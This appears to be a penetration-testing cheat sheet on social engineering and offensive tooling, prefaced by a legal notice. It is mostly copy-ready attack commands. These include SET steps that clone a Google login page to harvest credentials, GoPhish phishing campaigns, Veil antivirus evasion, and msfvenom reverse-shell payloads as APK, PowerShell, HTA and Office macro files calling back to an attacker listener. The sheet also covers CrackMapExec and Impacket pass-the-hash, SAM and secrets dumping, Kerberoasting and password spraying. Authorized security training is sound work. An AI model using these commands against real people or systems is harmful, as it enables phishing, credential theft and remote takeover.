# Social Engineering & Miscellaneous Tools

> **Legal Notice:** Social engineering attacks against real people without consent are illegal. Only perform these tests with explicit written authorization.

Social engineering exploits human psychology rather than technical vulnerabilities. This section also covers miscellaneous tools used across multiple phases.

---

## Social Engineering Toolkit (SET)

The go-to framework for simulating social engineering attacks.

```bash
# Launch SET
sudo setoolkit
```

### Common Attack Vectors

**Credential Harvesting (Phishing Page)**
```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
Enter URL to clone: https://accounts.google.com
Enter your IP address: 192.168.1.5
```
Victims who visit your IP see a cloned login page. Credentials are captured.

**Phishing Email with Payload**
```
1) Social-Engineering Attacks
1) Spear-Phishing Attack Vectors
1) Perform a Mass Email Attack
```

**Infectious USB/Media**
```
3) Infectious Media Generator
1) File-Format Exploits
```

---

## GoPhish — Phishing Campaign Manager

```bash
# Install
wget https://github.com/gophish/gophish/releases/latest/download/gophish-*-linux-64bit.zip
unzip gophish-*.zip
chmod +x gophish
./gophish

# Admin panel: https://localhost:3333
# Default credentials: admin / gophish

# Features:
# - Create phishing email templates
# - Clone landing pages
# - Track who clicked, who submitted credentials
# - Campaign statistics and reports
```

---

## Veil — AV Evasion Framework

```bash
# Install
sudo apt install veil -y
sudo veil

# Generate payloads that bypass antivirus
# Framework > Evasion
# Select language: Python, PowerShell, Ruby, etc.
# Choose payload type (meterpreter, reverse_tcp, etc.)
```

---

## Msfvenom Payloads (Miscellaneous)

```bash
# Android APK payload
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 R > malicious.apk

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 -f psh -o shell.ps1

# HTA payload (HTML application)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 -f hta-psh -o shell.hta

# Macro for Word/Excel
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 -f vba-exe

# Start listener
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
```

---

## Proxychains — Route Traffic Through Proxy

```bash
# Edit config
sudo nano /etc/proxychains4.conf
# Add at bottom:
# socks5 127.0.0.1 9050   (Tor)
# socks5 192.168.1.10 1080 (SOCKS proxy)

# Use with any command
proxychains nmap -sT 192.168.1.10
proxychains curl http://target.com
proxychains firefox

# Tor routing
sudo systemctl start tor
proxychains curl http://check.torproject.org
```

---

## CrackMapExec — Network Pentesting Swiss Army Knife

```bash
# SMB enumeration
crackmapexec smb 192.168.1.0/24

# Check null session
crackmapexec smb 192.168.1.10 -u '' -p ''

# Pass the hash
crackmapexec smb 192.168.1.10 -u admin -H NTLM_HASH

# Execute command
crackmapexec smb 192.168.1.10 -u admin -p password -x "ipconfig"

# Dump SAM
crackmapexec smb 192.168.1.10 -u admin -p password --sam

# Enumerate shares
crackmapexec smb 192.168.1.10 -u admin -p password --shares

# Spray passwords across network
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'
```

---

## Impacket — Windows Protocol Toolkit

```bash
# PsExec (remote command execution)
impacket-psexec domain/user:password@192.168.1.10

# SMBClient
impacket-smbclient domain/user:password@192.168.1.10

# Secretsdump (dump hashes remotely)
impacket-secretsdump domain/user:password@192.168.1.10

# Pass the hash
impacket-psexec -hashes :NTLM_HASH admin@192.168.1.10

# AS-REP Roasting (no pre-auth accounts)
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt

# Kerberoasting
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request
```

---

## Netcat Tricks

```bash
# Port scanning
for port in 21 22 23 25 80 443 445 3306 3389; do
  nc -z -v -w1 192.168.1.10 $port 2>&1 | grep "open"
done

# HTTP banner grab
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.10 80

# Chat over netcat
# Terminal 1 (listen): nc -lvnp 4444
# Terminal 2 (connect): nc 192.168.1.5 4444

# Netcat relay (pipe two nc instances)
mkfifo /tmp/relay
nc -lvnp 4444 < /tmp/relay | nc 192.168.1.10 80 > /tmp/relay
```

---

## CyberChef — Data Decoding/Encoding

CyberChef is a web app for encoding, decoding, hashing, and data transformation.

```bash
# Run locally with Docker
docker run -d -p 8080:8080 mpepping/cyberchef

# Access at: http://localhost:8080
```

Key operations:
- Base64 encode/decode
- URL encode/decode
- XOR cipher
- Hash (MD5, SHA1, SHA256, etc.)
- AES/DES encryption/decryption
- JWT decode
- From/To Hex

---

## Wordlist Resources

```bash
# Built-in Kali wordlists
ls /usr/share/wordlists/

# Most important
/usr/share/wordlists/rockyou.txt          # 14M passwords
/usr/share/wordlists/dirb/common.txt      # Web directories
/usr/share/wordlists/dirb/big.txt         # Larger web dirs
/usr/share/wordlists/metasploit/          # Various lists

# Install SecLists
sudo apt install seclists -y
ls /usr/share/seclists/

# Key SecLists categories
/usr/share/seclists/Passwords/
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/
/usr/share/seclists/Usernames/
/usr/share/seclists/Fuzzing/

# Download specific wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/xato-net-10-million-passwords-100000.txt
```

---

## Useful One-Liners

```bash
# Quickly start a web server for file transfers
python3 -m http.server 8080

# Quick reverse shell listener
nc -lvnp 4444

# Generate random password
openssl rand -base64 16

# Base64 encode/decode
echo "hello" | base64
echo "aGVsbG8=" | base64 -d

# URL encode a string
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"

# Generate MD5 hash
echo -n "password" | md5sum

# Quick port check
nc -zv 192.168.1.10 22 2>&1

# Find listening ports
ss -tulnp
netstat -tulnp

# Monitor network traffic live
watch -n1 'ss -s'
```

---

## Resources
- [How to Become an Ethical Hacker](https://www.freecodecamp.org/news/how-to-become-an-ethical-hacker/) — freeCodeCamp
- [The Ethical Hacking Lifecycle](https://www.freecodecamp.org/news/ethical-hacking-lifecycle-five-stages-of-a-penetration-test/) — freeCodeCamp
- [Impacket GitHub](https://github.com/fortra/impacket)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [CyberChef Online](https://gchq.github.io/CyberChef/)
